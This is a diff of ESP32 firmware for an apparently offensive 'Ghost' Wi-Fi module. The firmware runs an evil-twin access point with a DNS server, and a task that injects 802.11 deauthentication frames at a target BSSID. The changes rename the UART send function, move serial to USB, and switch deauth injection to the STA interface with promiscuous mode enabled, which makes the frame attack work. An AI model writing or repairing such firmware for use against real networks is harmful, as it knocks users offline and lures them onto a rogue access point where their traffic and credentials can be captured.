@@ -11,10 +11,10 @@
 #include "lwip/sockets.h"
 #include "lwip/netdb.h"
 
-// UART2 — same pinout as all other Ghost modules
-#define UART_PORT      UART_NUM_2
-#define UART_TX_PIN    17
-#define UART_RX_PIN    16
+// UART0 — communicates over USB (same port as idf.py monitor / COM3)
+#define UART_PORT      UART_NUM_0
+#define UART_TX_PIN    UART_PIN_NO_CHANGE
+#define UART_RX_PIN    UART_PIN_NO_CHANGE
 #define UART_BAUD_RATE 115200
 #define BUF_SIZE       1024
 
@@ -61,7 +61,7 @@ void uart_init() {
                  UART_PIN_NO_CHANGE, UART_PIN_NO_CHANGE);
 }
 
-void send(const char *msg) {
+void uart_send(const char *msg) {
     uart_write_bytes(UART_PORT, msg, strlen(msg));
 }
 
@@ -71,7 +71,7 @@ void sendf(const char *fmt, ...) {
     va_start(args, fmt);
     vsnprintf(buf, sizeof(buf), fmt, args);
     va_end(args);
-    send(buf);
+    uart_send(buf);
     printf("%s", buf);
 }
 
@@ -119,7 +119,7 @@ void system_init() {
 void dns_server_task(void *arg) {
     int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
     if (sock < 0) {
-        send("DNS:ERR_SOCKET\n");
+        uart_send("DNS:ERR_SOCKET\n");
         vTaskDelete(NULL);
         return;
     }
@@ -131,7 +131,7 @@ void dns_server_task(void *arg) {
     };
     bind(sock, (struct sockaddr *)&server_addr, sizeof(server_addr));
 
-    send("DNS:STARTED\n");
+    uart_send("DNS:STARTED\n");
     dns_running = true;
 
     uint8_t buf[512];
@@ -186,7 +186,7 @@ void dns_server_task(void *arg) {
     }
 
     close(sock);
-    send("DNS:STOPPED\n");
+    uart_send("DNS:STOPPED\n");
     vTaskDelete(NULL);
 }
 
@@ -236,7 +236,7 @@ void send_deauth_frame(const uint8_t *dst, const uint8_t *bssid) {
     memcpy(frame + 4,  dst,   6);   // destination
     memcpy(frame + 10, bssid, 6);   // source = BSSID
     memcpy(frame + 16, bssid, 6);   // BSSID
-    esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
+    esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
 }
 
 // ── Deauth task — runs continuously while deauth_running is true ──────────────
@@ -251,12 +251,13 @@ void deauth_task(void *arg) {
         vTaskDelay(100 / portTICK_PERIOD_MS);
     }
 
-    send("DEAUTH:STOPPED\n");
+    uart_send("DEAUTH:STOPPED\n");
     vTaskDelete(NULL);
 }
 
 void start_deauth() {
     deauth_running = true;
+    esp_wifi_set_promiscuous(true);  // required for raw frame TX in APSTA mode
     xTaskCreate(deauth_task, "deauth", 4096, NULL, 6, &deauth_task_handle);
     sendf("DEAUTH:STARTED BSSID=%02X:%02X:%02X:%02X:%02X:%02X CH=%d\n",
           target_bssid[0], target_bssid[1], target_bssid[2],
@@ -266,6 +267,7 @@ void start_deauth() {
 
 void stop_deauth() {
     deauth_running = false;
+    esp_wifi_set_promiscuous(false);
     deauth_task_handle = NULL;
 }
 
@@ -326,14 +328,14 @@ void start_ap(const char *ssid) {
 
 void stop_ap() {
     if (!ap_running) {
-        send("TWIN:AP_NOT_RUNNING\n");
+        uart_send("TWIN:AP_NOT_RUNNING\n");
         return;
     }
     stop_deauth();
     stop_dns();
     esp_wifi_stop();
     ap_running = false;
-    send("TWIN:AP_STOPPED\n");
+    uart_send("TWIN:AP_STOPPED\n");
 }
 
 // ── Command handler ───────────────────────────────────────────────────────────
@@ -347,7 +349,7 @@ void handle_command(char *cmd) {
     if (strncmp(cmd, "CMD:TWIN_START:", 15) == 0) {
         char *ssid = cmd + 15;
         if (strlen(ssid) == 0) {
-            send("ERR:NO_SSID\n");
+            uart_send("ERR:NO_SSID\n");
             return;
         }
         start_ap(ssid);
@@ -356,7 +358,7 @@ void handle_command(char *cmd) {
         stop_ap();
 
     } else {
-        send("ERR:UNKNOWN\n");
+        uart_send("ERR:UNKNOWN\n");
     }
 }
 
@@ -381,7 +383,10 @@ void app_main(void) {
     uart_init();
     system_init();
 
-    send("GHOST:READY\n");
+    // Wait for host to finish connecting before accepting commands
+    vTaskDelay(3000 / portTICK_PERIOD_MS);
+
+    uart_send("GHOST:READY\n");
 
     xTaskCreate(uart_rx_task, "uart_rx", 4096, NULL, 5, NULL);
 
